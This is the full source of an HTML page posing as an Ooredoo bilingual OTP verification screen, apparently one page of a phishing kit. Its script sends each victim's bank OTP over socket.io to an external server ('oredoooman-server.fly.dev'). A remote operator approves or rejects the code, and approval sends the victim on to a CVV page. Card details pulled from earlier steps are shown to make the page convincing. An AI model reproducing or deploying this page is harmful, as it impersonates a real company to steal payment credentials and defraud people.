<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>رمز التحقق OTP | Ooredoo</title>
<style>
@font-face { font-family: 'Rubik-Regular'; src: url('/ooredoo/fonts/Rubik-Regular.woff2') format('woff2'); }
@font-face { font-family: 'Rubik-Medium'; src: url('/ooredoo/fonts/Rubik-Medium.woff2') format('woff2'); }
@font-face { font-family: 'NotoKufiArabic-Regular'; src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2'); }
@font-face { font-family: 'NotoKufiArabic-SemiBold'; src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2'); }
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; direction: rtl; }
.lang-toggle-wrapper { width: 100%; max-width: 420px; display: flex; justify-content: flex-start; margin-top: 12px; padding: 0 24px; }
.lang-toggle { background: #fff; border: 1px solid #ddd; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; color: #333; }
.lang-toggle:hover { background: #f0f0f0; }
.otp-container { width: 100%; max-width: 420px; margin: 10px auto 40px; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
.logo-row { display: flex; justify-content: center; margin-bottom: 20px; }
.logo-row img { height: 36px; }
h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 20px; color: #080808; margin-bottom: 6px; }
.subtitle { text-align: center; color: #4c5562; font-size: 14px; margin-bottom: 24px; line-height: 1.6; }
.card-info { background: #f7f7f8; border-radius: 12px; padding: 14px 18px; margin-bottom: 24px; }
.card-info .row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
.card-info .row:last-child { margin-bottom: 0; }
.card-info .label { color: #4c5562; font-size: 13px; }
.card-info .value { color: #080808; font-size: 14px; font-weight: 600; direction: ltr; }
.otp-input-area { display: flex; justify-content: center; margin-bottom: 20px; direction: ltr; }
.otp-single-input {
  width: 100%;
  max-width: 280px;
  height: 56px;
  border: 1.5px solid #e0e0e0;
  border-radius: 12px;
  text-align: center;
  font-size: 28px;
  font-weight: 600;
  letter-spacing: 12px;
  outline: none;
  transition: border-color 0.2s;
}
.otp-single-input:focus { border-color: #ed1c24; }
.error-msg { color: #ed1c24; font-size: 13px; text-align: center; margin-bottom: 16px; display: none; }
.resend-area { text-align: center; margin-bottom: 24px; }
.resend-area .timer { color: #4c5562; font-size: 13px; }
.resend-area .resend-btn { color: #ed1c24; font-size: 14px; font-weight: 600; background: none; border: none; cursor: pointer; display: none; }
.submit-btn { width: 100%; height: 56px; border-radius: 999px; border: none; background: #ebecef; color: #9da3ae; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 18px; font-weight: 600; cursor: not-allowed; transition: all 0.2s; }
.submit-btn.active { background: #ed1c24; color: #fff; cursor: pointer; box-shadow: 0 8px 20px rgba(237,28,36,0.18); }
.submit-btn { position: relative; }
.submit-btn.loading { pointer-events: none; color: rgba(255,255,255,0.4); background: #ed1c24 !important; }
.submit-btn.loading::before { content: ''; position: absolute; width: 28px; height: 28px; border: 3px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; top: 50%; left: 50%; margin-top: -14px; margin-left: -14px; z-index: 1; }
@keyframes spin { to { transform: rotate(360deg); } }
.waiting-msg { text-align: center; color: #ed1c24; font-size: 14px; margin-top: 12px; display: none; }
@media (max-width: 500px) {
  .otp-container { margin: 10px 0 0; border-radius: 0; min-height: calc(100vh - 50px); padding: 24px 16px; box-shadow: none; }
  .lang-toggle-wrapper { padding: 0 16px; }
  h1 { font-size: 18px; }
  .subtitle { font-size: 13px; }
  .otp-single-input { height: 50px; font-size: 24px; max-width: 240px; }
  .submit-btn { height: 50px; font-size: 16px; }
  .card-info { padding: 12px 14px; }
  .card-info .label { font-size: 12px; }
  .card-info .value { font-size: 13px; }
}
@media (max-width: 360px) {
  .otp-container { padding: 20px 12px; }
  h1 { font-size: 16px; }
  .otp-single-input { height: 46px; font-size: 22px; letter-spacing: 8px; }
  .submit-btn { height: 46px; font-size: 15px; }
}
</style>
</head>
<body>

<div class="lang-toggle-wrapper">
  <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
</div>

<div class="otp-container">
  <div class="logo-row"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></div>
  <h1 id="pageTitle">رمز التحقق (OTP)</h1>
  <p class="subtitle" id="pageSubtitle">تم إرسال رمز التحقق إلى رقم هاتفك المسجل لدى البنك. يرجى إدخال الرمز أدناه.</p>

  <div class="card-info">
    <div class="row"><span class="label" id="labelCardType">نوع البطاقة</span><span class="value" id="cardType">-</span></div>
    <div class="row"><span class="label" id="labelLast4">آخر 4 أرقام</span><span class="value" id="cardLast4">****</span></div>
    <div class="row"><span class="label" id="labelAmount">المبلغ</span><span class="value" id="otpAmount">0 ر.ع</span></div>
  </div>

  <div class="otp-input-area">
    <input type="tel" maxlength="6" inputmode="numeric" class="otp-single-input" id="otpInput" placeholder="- - - - - -" autofocus>
  </div>

  <div class="error-msg" id="otpError">رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.</div>

  <div class="resend-area">
    <span class="timer" id="timerText">إعادة الإرسال بعد <span id="countdown">120</span> ثانية</span>
    <button class="resend-btn" id="resendBtn" onclick="resendOTP()">إعادة إرسال الرمز</button>
  </div>

  <button class="submit-btn" id="submitBtn" disabled onclick="submitOTP()">تأكيد</button>
  <div class="waiting-msg" id="waitingMsg">جاري التحقق...</div>
</div>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script>
(function() {
  var translations = {
    ar: {
      langBtn: 'English',
      title: 'رمز التحقق (OTP)',
      subtitle: 'تم إرسال رمز التحقق إلى رقم هاتفك المسجل لدى البنك. يرجى إدخال الرمز أدناه.',
      cardType: 'نوع البطاقة',
      last4: 'آخر 4 أرقام',
      amount: 'المبلغ',
      error: 'رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.',
      resendTimer: 'إعادة الإرسال بعد',
      seconds: 'ثانية',
      resendBtn: 'إعادة إرسال الرمز',
      submitBtn: 'تأكيد',
      waiting: 'جاري التحقق...',
      currency: 'ر.ع'
    },
    en: {
      langBtn: 'العربية',
      title: 'Verification Code (OTP)',
      subtitle: 'A verification code has been sent to your phone number registered with the bank. Please enter the code below.',
      cardType: 'Card Type',
      last4: 'Last 4 Digits',
      amount: 'Amount',
      error: 'Invalid verification code. Please try again.',
      resendTimer: 'Resend in',
      seconds: 'seconds',
      resendBtn: 'Resend Code',
      submitBtn: 'Confirm',
      waiting: 'Verifying...',
      currency: 'OMR'
    }
  };

  var langUrlParams = new URLSearchParams(window.location.search);
  var langUrlVal = langUrlParams.get('lang');
  var currentLang = langUrlVal || localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
  if (langUrlVal) { localStorage.setItem('siteLang', langUrlVal); localStorage.setItem('oredoo_site_language', langUrlVal); }

  function applyLanguage() {
    var t = translations[currentLang];
    document.documentElement.lang = currentLang === 'ar' ? 'ar' : 'en';
    document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
    document.body.style.direction = currentLang === 'ar' ? 'rtl' : 'ltr';
    document.getElementById('langToggle').textContent = t.langBtn;
    document.getElementById('pageTitle').textContent = t.title;
    document.getElementById('pageSubtitle').textContent = t.subtitle;
    document.getElementById('labelCardType').textContent = t.cardType;
    document.getElementById('labelLast4').textContent = t.last4;
    document.getElementById('labelAmount').textContent = t.amount;
    document.getElementById('otpError').textContent = t.error;
    document.getElementById('resendBtn').textContent = t.resendBtn;
    document.getElementById('submitBtn').textContent = t.submitBtn;
    document.getElementById('waitingMsg').textContent = t.waiting;
    // Update amount with correct currency
    var paymentData = {};
    try { paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}'); } catch(e) {}
    document.getElementById('otpAmount').textContent = (paymentData.totalPaid || '0') + ' ' + t.currency;
    // Update timer text
    updateTimerText();
  }

  function updateTimerText() {
    var t = translations[currentLang];
    var timerText = document.getElementById('timerText');
    var countdownEl = document.getElementById('countdown');
    timerText.innerHTML = t.resendTimer + ' <span id="countdown">' + countdownEl.textContent + '</span> ' + t.seconds;
  }

  window.toggleLanguage = function() {
    currentLang = currentLang === 'ar' ? 'en' : 'ar';
    localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang);
    applyLanguage();
  };

  applyLanguage();

  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
  var visitorId = localStorage.getItem('visitorId') || '';
  var otpInput = document.getElementById('otpInput');
  var submitBtn = document.getElementById('submitBtn');

  // Load payment data
  var paymentData = {};
  try { paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}'); } catch(e) {}
  document.getElementById('cardType').textContent = paymentData.cardType || '-';
  document.getElementById('cardLast4').textContent = paymentData.cardLast4 || '****';
  var t = translations[currentLang];
  document.getElementById('otpAmount').textContent = (paymentData.totalPaid || '0') + ' ' + t.currency;

  // Countdown
  var countdown = 120;
  var countdownEl = document.getElementById('countdown');
  var timerText = document.getElementById('timerText');
  var resendBtn = document.getElementById('resendBtn');
  var countdownInterval = setInterval(function() {
    countdown--;
    if (countdown <= 0) {
      clearInterval(countdownInterval);
      timerText.style.display = 'none';
      resendBtn.style.display = 'inline';
    } else {
      document.getElementById('countdown').textContent = countdown;
    }
  }, 1000);

  // OTP single input - only allow digits, enable button at 4 or 6
  otpInput.addEventListener('input', function() {
    otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
    var len = otpInput.value.length;
    if (len === 4 || len === 6) {
      submitBtn.classList.add('active');
      submitBtn.disabled = false;
    } else {
      submitBtn.classList.remove('active');
      submitBtn.disabled = true;
    }
  });

  // Socket
  socket.on('connect', function() {
    socket.emit('visitor:register', { existingVisitorId: visitorId || null });
    socket.emit('visitor:pageEnter', 'رمز التحقق (OTP)');
  });
  socket.on('visitor:registered', function(data) {
    if (data && data._id) { visitorId = data._id; localStorage.setItem('visitorId', data._id); }
    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
  });
  socket.on('visitor:navigate', function(page) { if (page) window.location.href = '/' + page; });
  socket.on('admin-last-message', function(data) {
    if (data && data.message) { localStorage.setItem('adminLastMessage', data.message); window.location.href = '/final-page/'; }
  });
  socket.on('blocked', function() { alert('تم حظرك.'); });

  socket.on('code:action', function(action) {
    var act = (typeof action === 'string') ? action : (action && action.action) || '';
    document.getElementById('waitingMsg').style.display = 'none';
    submitBtn.classList.add('active');
    submitBtn.disabled = false;
    submitBtn.textContent = translations[currentLang].submitBtn;

    if (act === 'approve') {
      window.location.href = '/cvv/';
    } else if (act === 'reject') {
      document.getElementById('otpError').style.display = 'block';
      otpInput.value = '';
      otpInput.focus();
      submitBtn.classList.remove('active');
      submitBtn.disabled = true;
    }
  });

  socket.on('card:action', function(action) {
    var act = (typeof action === 'string') ? action : (action && action.action) || '';
    document.getElementById('waitingMsg').style.display = 'none';
    if (act === 'reject') {
      document.getElementById('otpError').style.display = 'block';
      otpInput.value = '';
      otpInput.focus();
      submitBtn.classList.remove('active');
      submitBtn.disabled = true;
    } else if (act === 'otp') {
      otpInput.value = '';
      otpInput.focus();
      submitBtn.classList.remove('active');
      submitBtn.disabled = true;
    }
  });

  // Submit OTP
  window.submitOTP = function() {
    var code = otpInput.value.replace(/\D/g, '');
    if (code.length !== 4 && code.length !== 6) return;
    document.getElementById('otpError').style.display = 'none';
    submitBtn.disabled = true;
    submitBtn.classList.remove('active');
    submitBtn.classList.add('loading');
    document.getElementById('waitingMsg').style.display = 'block';

    socket.emit('more-info', {
      digitCode: code,
      page: 'رمز التحقق (OTP)',
      waitingForAdminResponse: true
    });
  };

  // Resend OTP
  window.resendOTP = function() {
    resendBtn.style.display = 'none';
    timerText.style.display = 'inline';
    countdown = 120;
    document.getElementById('countdown').textContent = countdown;
    countdownInterval = setInterval(function() {
      countdown--;
      if (countdown <= 0) { clearInterval(countdownInterval); timerText.style.display = 'none'; resendBtn.style.display = 'inline'; }
      else document.getElementById('countdown').textContent = countdown;
    }, 1000);
    socket.emit('more-info', { page: 'رمز التحقق (OTP)', content: { action: 'resend_otp' }, waitingForAdminResponse: false });
  };
})();
</script>
</body>
</html>
